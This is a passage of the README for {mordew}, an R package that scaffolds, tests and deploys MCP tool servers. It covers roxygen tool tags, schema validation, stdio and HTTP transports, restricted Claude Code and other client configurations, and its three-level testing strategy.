# `{mordew}`

<!-- badges: start -->

[![R-CMD-check](https://github.com/ThinkR-open/mordew/actions/workflows/R-CMD-check.yaml/badge.svg)](https://github.com/ThinkR-open/mordew/actions/workflows/R-CMD-check.yaml)

<!-- badges: end -->

> Build, test and ship MCP servers as R packages.

**Status: proof of concept**, not yet released. Tools are served over
stdio and HTTP, tested at three levels, and deploy to Docker and Posit
Connect. This README describes what the package does today; the
[roadmap](#roadmap-and-task-list) lists what is planned.

---

## Installation

`{mordew}` is not on CRAN: install it from GitHub.

```r
pak::pak(
  "ThinkR-open/mordew"
)
```

---

## The idea in one paragraph

`{mordew}` does for MCP servers what golem does for Shiny apps: **an MCP server
is an R package**. Each tool is an exported R function, documented with
roxygen and tested with testthat. `{mordew}` scaffolds the package, turns the
roxygen documentation into an MCP tool registry, serves that registry to
any MCP client (Claude Code, Claude Desktop, Codex, Copilot…), and provides
the testing, security and deployment conventions needed to run all this in
production. `{mordew}` does not ship a chat: a chat is a separate product,
which talks to a `{mordew}` server through MCP like any other client.

Throughout this README, the examples use `runlog`, a toy package that
answers questions about a (fake) running log: dates, types of run,
distances and durations.

```r
# create the package, with its dev/ scripts
mordew::create_mordew(
  path = "runlog"
)

# dev/02_dev.R: creates R/tool_summarise_runs.R and its test file
mordew::add_tool(
  name = "summarise_runs"
)

# try the tools with a model, from the R console
mordew::run_dev(
  chat = ellmer::chat_anthropic()
)

# dev/02_dev.R: creates dev/evals.R and a CI workflow that runs it
mordew::use_evals()

# run the MCP server: stdio by default, transport = "http" for several users
runlog::run_mcp_server()
```

---

## Why

### MCP is now the standard plug

The Model Context Protocol (MCP) is the standard way to give an AI
assistant access to tools and data. Claude, ChatGPT and Copilot all
speak it.

### Validated functions instead of generated code

For data teams, the question is no longer "do we need a chat?" but "what
can the model do with our data?". Letting a model write and run arbitrary
code is powerful, but it is hard to control, to reproduce and to audit.

The alternative is to expose a **closed set of validated R functions**. The
model chooses which function to call and with which arguments; R does the
computation. Results are reproducible, tested and traceable, which is what
regulated organisations (pharma, public research) need.

### Why a framework, given that the pieces exist

Every building block already exists in R (see [Prior art](#prior-art)).
What is missing is the assembly: a convention to structure, test, secure
and deploy an MCP server as a production artefact. That is the gap golem
filled for Shiny: Shiny, testthat, roxygen and Docker all existed before
golem, and golem's contribution was "an app is a package", plus the
conventions and the path to production.

---

## What `{mordew}` is, and what it is not

`{mordew}` **is**:

- an opinionated framework where one MCP server is one R package
- scaffolding: `create_mordew()`, `add_tool()`, `use_evals()`, `dev/` scripts
- MCP tools: the rest of the specification (resources, prompts, elicitation, tasks…) is on the [roadmap](#roadmap-and-task-list)
- a roxygen roclet that turns documentation into a tool registry
- a testing toolkit covering three levels: unit, contract, behaviour, plus security
- runtime helpers: its own thin MCP protocol layer, over stdio and HTTP, with a worker pool and limits
- deployment helpers: Docker and Posit Connect

`{mordew}` **is not**:

- an LLM client: `{mordew}` never calls a model itself, except in behavioural
  evals, which run the model through the `claude` CLI
- a chat: a chat is a separate product, an MCP client like any other
  (see [Scope: the chat is a separate product](#scope-the-chat-is-a-separate-product))
- a sandbox: OS-level isolation is documented and scaffolded, not reinvented

### Scope: the chat is a separate product

A chat that talks MCP does not depend on the server it connects to: it
works with any MCP server, written in R or not. Its concerns are those of
another product (user authentication, conversation history, choice of
model, safe rendering, scaling Shiny sessions), and its dependencies
(shiny, shinychat, ellmer) would weigh on every package built with
`{mordew}`. So `{mordew}` stops at the MCP server.

- **To try tools during development**: `mordew::run_dev()` opens an
  ellmer chat in the R console, or gives the command of a Claude Code
  session, connected to the package's MCP server (see [Development
  loop](#development-loop-run_dev)). The other ways to
  try them, with or without a model, are in [Trying the
  tools](#trying-the-tools).
- **To give users a chat**: build it as its own application, for example
  a golem app using shinychat and ellmer, that connects to the `{mordew}`
  server through MCP. Everything the server enforces (validation, limits,
  the worker pool) then applies to the chat too. The
  section [Clients we build ourselves](#clients-we-build-ourselves) lists
  what such a chat must get right.

---

## Prior art

| Project                                                                                      | What it does                                                                                                                                       | Gap `{mordew}` addresses                                                          |
| -------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------- |
| [mcptools](https://posit-dev.github.io/mcptools/) (Posit)                                    | MCP server from arbitrary R functions (ellmer tools), stdio or HTTP. MCP client for ellmer chats. Turnkey deployment documented for Posit Connect. | No project structure, no testing conventions, no deployment path outside Connect. |
| [mcpr](https://github.com/devOpifex/mcpr) (devOpifex)                                        | Roxygen roclet: `@mcp` and `@type` tags generate `inst/mcp_server.R`. Tools, resources and prompts.                                                | Generates a file, not a project framework.                                        |
| [mcpr](https://chi2labs.github.io/mcpr/index.html) (chi2labs)                                | Decorator-based MCP server, following plumber's patterns.                                                                                          | No package structure.                                                             |
| [plumber2mcp](https://github.com/armish/plumber2mcp)                 | Turns a plumber API into an MCP server.                                                                                                            | Starts from an API, not from a domain package.                                    |
| [mcplite](https://CRAN.R-project.org/package=mcplite)                        | Lightweight stdio MCP server, with OpenTelemetry spans.                                                                                            | stdio only, no production framework.                                              |
| [shinychat](https://opensource.posit.co/blog/2025-11-20_shinychat-tool-ui/) + ellmer (Posit) | Shiny chat UI wired to a model, with tool-call display.                                                                                            | A building block for a separate chat product, outside `{mordew}`'s scope.         |
| [btw](https://posit-dev.github.io/btw/) (Posit)                                              | Ready-made tools that give models context about R sessions and packages.                                                                           | Aimed at coding assistants, not at domain tools.                                  |
| [FastMCP](https://gofastmcp.com/docs) (Python)                                               | The reference framework in Python: schema, validation, authentication, deployment.                                                                 | No R equivalent.                                                                  |

The Python side carries two lessons:

1. **The framework layer has value even when the SDK exists.** According
   to [its README](https://github.com/PrefectHQ/fastmcp),
   some version of FastMCP powers 70% of MCP servers, all languages
   combined.
2. **The framework and the SDK can be one package.** FastMCP 1.0 was
   merged into the official MCP Python SDK in 2024.

---

## What makes `{mordew}` different

`{mordew}` does not try to be an MCP client: Claude, ChatGPT and Copilot
already do that well. It focuses on **industrialisation**: the model only
ever reaches R functions that are documented, typed and tested like any
package code, and the same package carries everything needed to deploy
them.

| `{mordew}` brings                                                                                      | Why it matters                                                                                      | Covered elsewhere in R?       |
| ------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------- | ----------------------------- |
| **Package convention**: `create_mordew()`, `add_tool()`, `dev/` scripts                                | An MCP server is developed, versioned, reviewed and installed like any package.                     | No                            |
| **Three-level testing**: the function, the MCP contract, the model's behaviour                         | Proves that the tool computes correctly, is exposed correctly, and is called correctly.             | Level 1 only                  |
| **Production without Posit Connect**: Dockerfile, a shared token, multi-user, asynchronous execution | Production R often runs in containers, outside Posit Connect, and must serve several users at once. | No, it has to be done by hand |
| **Return conventions**: data frame → table, plot → image, errors the model can act on                  | Keeps the model's context small and answers usable.                                                 | No                            |
| **Restricted client configurations** (`mcp_client_config()`)                                           | Generates the most restricted setup each client allows, and says when it is only partial.           | No                            |

---

## Architecture

### Who calls whom

The MCP server never calls the model, and the model never calls the
server either. A model only produces text: when it wants a tool, its
answer contains a request ("call `summarise_runs` with
`year = 2025`"). The **client** (Claude Code,
ellmer, a chat app…) reads that request, calls the MCP server, and sends
the result back to the model.

```mermaid
sequenceDiagram
  participant U as User
  participant C as MCP client
  participant M as Model (API)
  participant S as mordew server (R)
  C->>S: tools/list
  S-->>C: tool definitions
  U->>C: question
  C->>M: question + tool definitions
  M-->>C: "call summarise_runs(2025)"
  C->>S: tools/call summarise_runs
  S-->>C: result of the R function
  C->>M: tool result
  M-->>C: final answer, or another tool call
  C-->>U: answer
```

This has three consequences for `{mordew}`:

- **The server never sees the model.** It has no API key, no prompt and
  no conversation: only tool calls and their arguments. The model and the
  system prompt belong to the client.
- **The model has no network access to the server.** Everything goes
  through the client, which is what lets a client restrict the tools.
- **Arguments are untrusted input.** The server cannot know where a
  request comes from, or whether the model was manipulated.

### From package to server

```mermaid
flowchart LR
  subgraph pkg["Your R package"]
    F["R/: one function per tool"]
    X["roxygen: descriptions + types"]
    T["tests/: unit, contract, evals"]
  end
  pkg -- "roclet" --> REG["Tool registry<br/>declarative R lists"]
  REG --> SRV["MCP server<br/>mordew, stdio or HTTP"]
  SRV --> EXT["MCP clients<br/>Claude Code, Claude Desktop, Codex, Copilot"]
  SRV --> CHAT["A separate chat app<br/>an MCP client, outside mordew"]
```

The **tool registry** is the centre of the design. It is generated once
from roxygen and served through a single MCP server to every client. A
chat application is one of those clients, built and deployed separately.
The registry is declarative data, committed and reviewed; everything
that executes — the server loop, validation, serialisation — is imported
from `{mordew}` at runtime, so a fix reaches deployed servers through an
update, not a regeneration.

### Anatomy of a `{mordew}` package

What `create_mordew()`, `add_tool()`, `use_evals()`, `add_dockerfile()`
and `add_connect()` generate:

```
runlog/
├── DESCRIPTION
├── NAMESPACE
├── R/
│   ├── tool_summarise_runs.R    # one file per tool
│   ├── run.R                    # run_mcp_server()
│   └── mordew_registry.R        # generated by the roclet, do not edit
├── inst/
│   └── mordew/
│       └── instructions.md      # server instructions sent to clients
├── tests/
│   ├── testthat.R
│   └── testthat/
│       ├── test-tool_summarise_runs.R  # unit, schema snapshot, extreme arguments
│       └── test-check_tools.R          # no call that can run code
├── dev/
│   ├── 01_start.R
│   ├── 02_dev.R
│   ├── 03_deploy.R
│   └── evals.R                  # behavioural evals, not run by R CMD check
├── .github/workflows/evals.yaml # runs dev/evals.R, started by hand
├── Dockerfile
└── _server.yml                  # Posit Connect
```

### Writing a tool

A tool is a regular exported function. Its roxygen block is both the R
documentation and the MCP definition.

```r
#' Year summary
#'
#' Returns the totals of one year for each type of run: number of runs,
#' distance (km) and duration (hours). For month by month totals, use
#' summarise_runs_by_month.
#'
#' @param year Four-digit year.
#'
#' @mcpTool
#' @mcpType year type_integer(min = 2024, max = 2025)
#' @mcpReturns table
#' @mcpReadOnly
#' @mcpClosedWorld
#' @export
summarise_runs <- function(
  year
) {
  # validated computation on the runs dataset lives here
}
```

Tag specification. Tag names are camelCase, as roxygen2's own
(`@inheritParams`): roxygen2 cuts a tag name at `_`, `.` or `-`.

| Tag                               | Role                                                                                                                                                                       |
| --------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `@mcpTool [name]`                 | Exposes the function as a tool. The name defaults to the function's; it must be 1 to 128 characters among `A-Z a-z 0-9 _ - .`.                                             |
| `@mcpType <param> <expression>`   | The parameter's type, as an R expression (see below). Required for every parameter; naming a parameter the function does not have is an error.                             |
| `@mcpReturns <kind>`              | Required: `text`, `table`, `image` or `json`; drives serialisation.                                                                                                        |
| `@mcpReadOnly`                    | `readOnlyHint: true`: the tool does not modify its environment.                                                                                                            |
| `@mcpNonDestructive`              | `destructiveHint: false`. Redundant next to `@mcpReadOnly`, which already implies it.                                                                                      |
| `@mcpIdempotent`                  | `idempotentHint: true`: a second call with the same arguments has no further effect. Redundant next to `@mcpReadOnly`, which already implies it.                           |
| `@mcpClosedWorld`                 | `openWorldHint: false`: the tool does not reach external entities.                                                                                                         |
| `@mcpLimit rows <n>`              | Maximum number of rows a `table` returns, and an error on any other kind; the default is 50. Over HTTP, `run_mcp_server(timeout = )` caps the duration of every call. |

**Annotations err on the side of caution.** A tool without annotation
tags sends no annotations, and clients apply the MCP defaults: it may
modify and destroy, is not safe to call twice, and reaches the outside
world. The tags only declare what is safe, so a forgotten tag makes a
client ask for confirmation more often, never less.

A tag whose content is structured takes an R expression, never a grammar
of its own: the roclet parses and evaluates it in a prepared environment
where `{mordew}`'s type constructors are attached. They exist only there:
`{mordew}` does not export them, and the registry holds plain R lists, so
a deployed server does not depend on ellmer. An expression stays
recursive where JSON Schema is (arrays of objects, where a flat grammar
breaks down).

The constructors follow ellmer's API and add the constraints ellmer types
lack (checked with ellmer 0.3.2: `description` and `required` only); they
can be proposed to ellmer.

| Constructor                            | JSON Schema 2020-12                     |
| -------------------------------------- | --------------------------------------- |
| `type_string(pattern = NULL)`          | `string`, with `pattern`                |
| `type_integer(min = NULL, max = NULL)` | `integer`, with `minimum` and `maximum` |
| `type_number(min = NULL, max = NULL)`  | `number`, with `minimum` and `maximum`  |
| `type_boolean()`                       | `boolean`                               |
| `type_enum(values)`                    | `string`, with `enum`                   |
| `type_array(items)`                    | `array` of `items`                      |
| `type_object(...)`                     | `object` with the named fields          |

Every constructor also takes `required = TRUE` and `description = NULL`
(`.required` and `.description` for `type_object()`, as in ellmer).
`required = FALSE` matches a parameter that has a default value in the
function's signature, and only that: the roclet fails on any mismatch. A
parameter's description comes from its `@param`, which the roclet
requires; `description` only describes nested types (array items, object
fields). The tool's `inputSchema` is a `type_object()` of the parameters,
in the order of the signature: one property per parameter, the required
ones listed in `required`. Every `type_object()` sets
`additionalProperties: false`, so fields it does not describe are
rejected, at every level.

The server validates the arguments against this schema, then converts
them before calling the function, so a type always reaches the tool as
the same R type: an `integer` becomes an R integer, a `number` a double,
an array of scalars a vector of their type (an empty array included, as
`character(0)` for strings), an object a named list, and an array of
objects or arrays a list. An integer beyond R's integer range is
rejected rather than turned into `NA`.

Single-word tags (`@mcpReturns table`, `@mcpReadOnly`) stay words: one
word from a closed set is not a language.

The roxygen title becomes the tool's `title`, shown to users; the
description becomes its `description`, read by the model; and each
`@param` becomes a parameter description. Roxygen sends the paragraphs
after the description to `@details`: they stay in the R help, and the
model never reads them. **These texts are prompts**: they should say when
to use the tool, when not to, and give units and formats. The roclet
stops on a tool without title or description, and on `@mcpTool` on an
object that is not a function.

### Return conventions

| R value                   | Sent to the model as                                                         |
| ------------------------- | ---------------------------------------------------------------------------- |
| `character`               | text content, one element per line                                           |
| `data.frame`              | markdown table with dimensions, truncated to `@mcpLimit rows` (default 50)   |
| `ggplot` or recorded plot | PNG image content, 800×600 at 96 dpi                                         |
| `list`                    | JSON                                                                         |
| condition (error)         | an `isError` result with a message the model can act on                      |

A value that does not match the tool's `@mcpReturns` comes back as an
`isError` result naming the declared kind and the received one.

The server catches errors along the whole call: argument validation, the
tool itself, then serialisation, since a ggplot only fails when printed.
Each one comes back as an `isError` result.

### MCP specification coverage

`{mordew}` speaks the **2025-11-25 revision** of the specification,
which is what clients send today (see [Design
decisions](#design-decisions)). It handles `initialize`, `ping`,
`tools/list` and `tools/call`.

| Feature                    | What it is                                                            | In `{mordew}`                                    |
| -------------------------- | --------------------------------------------------------------------- | ------------------------------------------------ |
| Tools                      | Functions the model calls                                             | One R function per tool                          |
| Tool title and annotations | Display name, read-only, destructive, idempotent, open-world hints    | roxygen title and annotation tags                |
| Error reporting            | Tool errors as `isError` results, protocol errors with standard codes | Built in                                         |
| Transports                 | stdio, and Streamable HTTP                                            | Both; over HTTP, without sessions or SSE streams |

The rest of the specification is not implemented: resources, prompts,
structured output, elicitation, completion, progress, cancellation,
tasks, and the 2026-07-28 revision. They are on the
[roadmap](#roadmap-and-task-list).

### Runtime and process model

- **The server owns its process.** `run_mcp_server()` blocks the R
  process that calls it: it is meant to be the main loop of a dedicated
  process, never something run inside another app.
- **Transports.** With stdio, each desktop client spawns its own R
  process: one user, no auth. With HTTP, one shared server serves many
  users, so it needs authentication and a concurrency strategy.
- **Concurrency.** R is single-threaded: a server that runs tools in its
  own process runs one call at a time. **Asynchronous execution is a
  hard requirement for production**: a server that blocks on every call
  cannot serve several users. See [Scaling an HTTP
  deployment](#scaling-an-http-deployment).
- **State.** Tools must be stateless, so that any process can answer
  any call.
- **Malformed input never stops the server.** A line that is not JSON
  gets a -32700 error, a message that is not a request object or has no
  string `method` gets -32600, and a tool call without a string `name`,
  or whose `params` or `arguments` are not objects, gets -32602; the
  server then reads the next line. Messages are read
  and written as UTF-8 whatever the locale, as the specification
  requires, and numbers are written without rounding.

### Why not build on mcptools

[mcptools](https://posit-dev.github.io/mcptools/) is the obvious base:
maintained by Posit, stdio and HTTP, deployable on Posit Connect.
`{mordew}` still ships its own protocol layer, for three reasons, read
in the mcptools source (development version 1.0.3.9000, commit 714803b).

1. **What `{mordew}` would reuse is the cheap part**: the stdio loop and
   the `tools/list` and `tools/call` dispatch, about 130 lines of base R
   and jsonlite.
2. **What `{mordew}` needs, mcptools does differently or not at all.**
   `mcp_server()` only takes `tools`, `type`, `host`, `port` and
   `session_tools`; everything else is internal code, so each point
   means wrapping or replacing it:
   - the server identity is fixed ("R mcptools server", version 0.0.1),
     where `{mordew}` takes it from the package;
   - arguments are not validated, R errors become JSON-RPC errors
     (-32603) instead of `isError` results, and data frames go through
     `paste()`, where `{mordew}` has its own validation and return
     conventions;
   - the schema comes from an ellmer internal and cannot carry `min`,
     `max` or `pattern`;
   - HTTP is synchronous: the request handler runs the tool itself, so a
     slow call blocks every client, where `{mordew}` hands calls to a
     worker pool.
3. **The dependency would reach every deployed server.** A generated
   package depends on `{mordew}` at runtime, so mcptools' eleven direct
   imports (httpuv, httr2, nanonext, processx…) would come with it,
   against minimal runtime `Imports` (see [Design
   decisions](#design-decisions)).

The client side follows. Contract tests need the raw JSON-RPC response,
which `mcp_tools()` turns into ellmer objects; over stdio it also waits
4 seconds at most and does not check response ids. A minimal stdio
client of our own serves both `call_tool()` and `run_dev()`: it starts
the server, opens a 2025-11-25 session, returns the raw response that
carries each request's id, waits up to a configurable timeout, and
reports the end of the server's stderr when the server stops. On
Windows, writing a request larger than the pipe buffer to a server that
does not read its stdin blocks until the server reads or exits: the
timeout only applies to the answer.

The cost: following the specification becomes `{mordew}`'s work (see
[Risks](#risks)), and Posit Connect needs `{mordew}`'s own engine rather
than mcptools' `engine: mcptools` (see [Posit Connect](#posit-connect)).

### Connecting external clients

Claude Code:

```bash
claude mcp add runlog -- Rscript --no-init-file -e "runlog::run_mcp_server()"
```

Claude Desktop (`claude_desktop_config.json`):

```json
{
	"mcpServers": {
		"runlog": {
			"command": "Rscript",
			"args": ["--no-init-file", "-e", "runlog::run_mcp_server()"]
		}
	}
}
```

`--no-init-file` is not cosmetic: a user `.Rprofile` that prints to
stdout corrupts the JSON-RPC stream before the first message.

`mcp_client_config("claude_desktop")` writes this snippet for the
package, with the full path of the current `Rscript`: a desktop app may
not find `Rscript` on its `PATH`.

Over HTTP, the server runs on its own and clients connect to its URL:

```r
# in a dedicated R process: 127.0.0.1:8000, 4 workers, 60-second calls,
# 8 calls waiting at most
runlog::run_mcp_server(
  transport = "http"
)
```

```bash
claude mcp add --transport http runlog http://127.0.0.1:8000/mcp
```

It follows the Streamable HTTP transport of MCP 2025-11-25, without
sessions or SSE streams: a POST gets a JSON response, a notification 202,
a GET on the MCP endpoint 405 (no stream offered), a path other than
`/mcp` and `/health` 404; an `Origin` other than `localhost` gets 403
(against DNS rebinding), another `MCP-Protocol-Version` 400, and a
`Content-Length` over 4 MB 413. It
listens on `127.0.0.1` only by default, as the specification recommends
for a local server.

With a token, every request but `GET /health` must send
`Authorization: Bearer <token>`, or gets a 401 with
`WWW-Authenticate: Bearer`; the token is compared in constant time. It
comes from the `MORDEW_TOKEN` environment variable by default. The token
is optional: a proxy or a gateway in front may authenticate the clients
instead, or the network may be private. Serving on another host than
`127.0.0.1`, `localhost` or `::1` without one prints a warning at
start-up, so that an open server does not go unnoticed.

The 403, 404, 401, 405, 400 and 413 above are settled on the headers: the server
answers when they arrive, and never reads the body of a request it
refuses.

```bash
MORDEW_TOKEN=... Rscript -e "runlog::run_mcp_server(transport = 'http', host = '0.0.0.0')"
claude mcp add --transport http runlog http://server:8000/mcp --header "Authorization: Bearer ..."
```

A shared token suits an internal deployment. It is not the OAuth 2.1
authorization of the MCP specification: one secret for every user, no
identity, no expiry, and no discovery for clients that only speak
OAuth. `{mordew}` does not plan OAuth: a deployment that needs it puts a
gateway that handles it in front of the server.

`GET /health` answers `200` with `{"status":"ok"}` from the front, even when every
worker is busy: it is the probe for load balancers, Docker and
Kubernetes. Another method on `/health` gets a 405.

### A Claude Code session restricted to the server

Claude Code has no `--mcp-only` flag, but a few flags give the same result,
and it is enforced, not just requested:

```bash
claude \
  --tools "" \
  --strict-mcp-config \
  --mcp-config ./runlog.json \
  --no-chrome \
  --disallowedTools "mcp__ide" \
  --allowedTools "mcp__runlog__*" \
  --permission-mode dontAsk
```

where `runlog.json` holds the Claude Desktop snippet above.

| Flag                              | Effect                                                                                                             |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| `--tools ""`                      | Removes every built-in tool (Bash, Read, Edit, web access…). MCP tools are not affected.                           |
| `--strict-mcp-config`             | Loads only the servers passed with `--mcp-config`, ignoring `.mcp.json`, user configuration and other MCP sources. |
| `--mcp-config ./runlog.json`      | Loads the `{mordew}` server.                                                                                       |
| `--no-chrome`                     | Turns off Claude in Chrome, whose browser tools (`javascript_tool`…) `--strict-mcp-config` keeps.                  |
| `--disallowedTools "mcp__ide"`    | Removes the tools of the IDE server, which Claude Code connects to by itself in an IDE's integrated terminal and `--strict-mcp-config` keeps (`executeCode` runs Python in the Jupyter kernel). A deny rule naming a whole server removes its tools from the model's context. |
| `--allowedTools "mcp__runlog__*"` | Approves the server's tools without prompting. It only changes permissions: it removes nothing.                    |
| `--permission-mode dontAsk`       | Denies every call that would ask for permission, so only the approved tools can act, even if a later Claude Code version adds another source of tools. Calls that never ask, such as reads, still run. |

`--disable-slash-commands` also turns off skills and slash commands,
`/mcp` included: to see the server's status, run the command without it.
In such a session, the model cannot run shell commands or read files: those
tools simply do not exist. The only built-in tool left is
`EndConversation`, which only ends the conversation. One caveat: when an organisation deploys a
managed `managed-mcp.json`, Claude Code exits at startup if
`--strict-mcp-config` is passed. See the [CLI
reference](https://code.claude.com/docs/en/cli-reference) and the [MCP
documentation](https://code.claude.com/docs/en/mcp).

`mcp_client_config("claude_code")` writes this command and its
configuration file, which `add_mcp_client_config()` saves at the package
root and adds to `.Rbuildignore` and `.gitignore` (it holds the path of
the current `Rscript`). The command has
`--disable-slash-commands` (checked with Claude Code 2.1.331 on
2026-11-24, in an IDE terminal with Claude in Chrome installed: the
session lists only the server's tools and `EndConversation`).

### Restricting other MCP clients

Claude Code is the only client found so far with a documented,
all-or-nothing switch for built-in tools. Elsewhere, restriction goes
through configuration, is partial, and is sometimes explicitly described
as not being a security mechanism. Checked in November 2026:

| Client                                                                           | Remove built-in tools                                                                                                                                                   | Restrict MCP servers and tools                                                                  | How far it goes                                                                                                                                                                                                       |
| -------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [Claude Code](https://code.claude.com/docs/en/cli-reference)                     | `--tools ""` removes every built-in tool                                                                                                                                | `--strict-mcp-config` + `--mcp-config`; `--no-chrome` and `--disallowedTools "mcp__ide"` for the Chrome and IDE servers; `--permission-mode dontAsk` | Enforced: the tools are not in the session.                                                                                                                                                                           |
| [Codex CLI](https://github.com/openai/codex/issues/6049)                         | `features.shell_tool = false` (or `codex --disable shell_tool`). Other features (`multi_agent`, `view_image`, `web_search = "disabled"`…) can be turned off one by one. | `mcp_servers.<id>.enabled_tools` and `disabled_tools`                                           | Partial: no official MCP-only mode (the request is still open). Three MCP resource tools (`list_mcp_resources`, `list_mcp_resource_templates`, `read_mcp_resource`) cannot be disabled; they only read MCP resources. |
| [Gemini CLI](https://geminicli.com/docs/reference/configuration/)                | `tools.core` (allowlist) or `tools.exclude` (deprecated), tool by tool; no documented "none" option                                                                     | `mcp.allowed` or `--allowed-mcp-server-names`; per-server `includeTools` and `excludeTools`     | Partial: [the documentation](https://geminicli.com/docs/cli/enterprise/) says these settings should not be considered a foolproof security boundary.                                                                  |
| [VS Code, Copilot](https://code.visualstudio.com/docs/agent-customization/tools) | Tool picker per request; a custom agent with its own tool list for a reusable selection                                                                                 | Same picker, per server and per tool; enterprise allowlist of MCP servers                       | Per session or per agent, configured in the editor.                                                                                                                                                                   |

Two consequences for `{mordew}`:

1. **The server is the security boundary, not the client.** Whatever the
   client, the closed tool list, argument validation, limits and
   OS-level isolation described in the [security model](#security-model)
   must hold on their own.
2. **`mcp_client_config()` generates the most restricted configuration
   each client allows**, and says plainly when that restriction is
   partial. It is a development tool: it does not contain a client in
   production. Neither can the server, which MCP never shows the
   client's other tools or the conversation: containing the client is
   the job of whoever deploys it.

### Trying the tools

| Way                                                                        | Model                                           | Version served                                           | What for                                                                                       |
| -------------------------------------------------------------------------- | ----------------------------------------------------------------- | -------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| `call_tool()`                                                              | none                                            | development, after `devtools::load_all()`; or installed  | one call and its exact result, in the console or in a test                                     |
| [MCP Inspector](https://github.com/modelcontextprotocol/inspector)        | none                                            | the command it is given                                  | list the tools, fill their arguments in a form, read the raw protocol messages                 |
| `run_dev()`                                                                | an ellmer chat, or Claude Code with `client = "claude"` | development                                              | see by hand which tool the model picks, and with which arguments                               |
| `add_mcp_client_config()` and its [restricted Claude Code session](#a-claude-code-session-restricted-to-the-server) | Claude Code                                     | installed                                                | the package as its users will get it                                                           |
| `dev/evals.R`, from `use_evals()`                                          | Claude Code                                     | development                                              | the check of `run_dev()`, automated over a set of questions, several runs each                 |

`call_tool()` runs outside tests too, given the package:

```r
devtools::load_all()
mordew::call_tool(
  "summarise_runs",
  list(
    year = 2025
  ),
  package = "runlog"
)
```

The MCP Inspector starts the server from its command and arguments: the
ones `mcp_client_config()` writes. With version 2.16.0, its own options
come first and the server command after `--`, or it takes `-e` for one
of its options (checked on 2026-11-25):

```bash
npx @modelcontextprotocol/inspector@2.16.0 --cli --method tools/list -- \
  Rscript --no-init-file -e "runlog::run_mcp_server()"
```

`call_tool(client = "inspector")` runs the same call through it.

### Development loop: `run_dev()`

`{mordew}` ships no chat, but it gives a quick way to talk to the package's
tools while developing them, the way `golem::run_dev()` runs a Shiny app
under development. It works with ellmer, or with the `claude` CLI:

```r
# any model provider, through ellmer (needs an API key)
mordew::run_dev(
  client = "ellmer",
  chat = ellmer::chat_anthropic(),
  ui = "console"
)

# the `claude` CLI and its login, for example a Claude subscription
mordew::run_dev(
  client = "claude"
)
```

In both cases, the stdio server runs the development version of the
package (`Rscript --no-init-file -e "pkgload::load_all(<path>, quiet = TRUE); <package>::run_mcp_server()"`);
with `client = "claude"`, `run_dev()` first writes a temporary MCP
configuration that starts it. Then:

|                             | `client = "ellmer"`                                                                 | `client = "claude"`                                                                              |
| --------------------------- | ----------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
| Connects to the server with | `{mordew}`'s stdio client, whose tools become ellmer tools, then `chat$set_tools()`; the server's instructions join the chat's system prompt | `--mcp-config` pointing to the temporary configuration                                           |
| Opens                       | `ellmer::live_console()`, or `ellmer::live_browser()` with `ui = "browser"`         | nothing: it prints the command to paste in a terminal, such as the IDE's integrated terminal    |
| Model and billing           | any ellmer provider or a local model; API key in the environment, billed per token  | the user's Claude Code login, for example a Claude subscription                                  |
| Other tools available       | none: ellmer only sends the server's tools                                          | none: the session is [restricted to the server](#a-claude-code-session-restricted-to-the-server) |

With `client = "claude"`, the command `run_dev()` prints is:

```bash
claude --tools "" --strict-mcp-config \
  --mcp-config /tmp/runlog-mcp.json --no-chrome \
  --disallowedTools "mcp__ide" --allowedTools "mcp__runlog__*" \
  --permission-mode dontAsk --disable-slash-commands
```

Claude Code is a full-screen terminal interface, so it cannot run inside
the R console: the command is printed rather than launched. For a
one-off question from R, `claude -p`, with the same flags, returns the
answer and the tool calls: that is how `run_evals()` asks its questions,
with `--output-format stream-json`.

The tools go through MCP, exactly as they will for any other client:
same schema, same validation, same serialisation. Each tool call is
shown with its arguments, so it is clear at once whether the model picks
the right tool. One exception with ellmer 0.3.2: it sends tool results to
the model as text, so an `image` tool reaches the model as a line saying
an image was returned.

Things to keep in mind:

- The server runs in its own process: changing a tool means restarting
  `run_dev()`, after `devtools::document()` when its roxygen tags changed,
  since the registry comes from them.
- In stdio mode, nothing but protocol messages may reach stdout:
  `Rscript` runs with `--no-init-file` (a user `.Rprofile` may print)
  and package loading must stay quiet. While it handles a request, the
  server diverts stdout to stderr, so a `cat()` or `print()` left in a
  tool lands in the logs instead of the stream.
- `run_dev()` is a manual version of the level 3 tests: evals automate
  the same loop over a set of questions.

---

## Testing strategy

Testing is at the core of `{mordew}`. There are three levels, plus
security tests.

| Level        | Question answered                                            | Tooling                                 | Where it runs                    |
| ------------ | ------------------------------------------------------------ | --------------------------------------- | -------------------------------- |
| 1. Unit      | Does the function compute the right result?                  | testthat                                | `R CMD check`, CI                |
| 2. Contract  | Is the tool exposed correctly over MCP?                      | `{mordew}` helpers + testthat snapshots | `R CMD check`, CI                |
| 3. Behaviour | Does the model pick the right tool with the right arguments? | evals through the `claude` CLI          | separate CI job, before releases |
| Security     | Does the tool resist hostile arguments?                      | `{mordew}` helpers                      | `R CMD check`, CI                |

**Level 2, the contract**, is the one nobody covers today. It checks that:

- every parameter is documented and typed, and every typed parameter exists
- the generated JSON schema matches a snapshot, so that any change to a
  tool's interface shows up in review as a breaking change
- return values serialise to valid MCP content
- errors come back as `isError` results, not as crashes
- a full round-trip works through a real MCP client over stdio

```r
test_that("summarise_runs is exposed with a stable schema", {
  expect_tool_schema(
    tool = "summarise_runs"
  )
})

test_that("summarise_runs answers through a real MCP client", {
  skip_on_cran()
  res <- call_tool(
    tool = "summarise_runs",
    args = list(
      year = 2025
    ),
    transport = "stdio"
  )
  expect_false(
    res$isError
  )
})
```

`add_tool()` writes the schema snapshot test with the tool. `call_tool()`
starts the package's server in a separate R process and talks to it
through `{mordew}`'s stdio client, one server per call so that no state
leaks between tests: under `devtools::test()` the server loads the
development version with `pkgload::load_all()`, under `R CMD check` it
runs the installed package. A protocol error (an unknown tool) is an R
error; a tool error is an `isError` result, which `expect_tool_error()`
checks, with an optional pattern on its message.

With `client = "inspector"`, `call_tool()` makes the same call through the
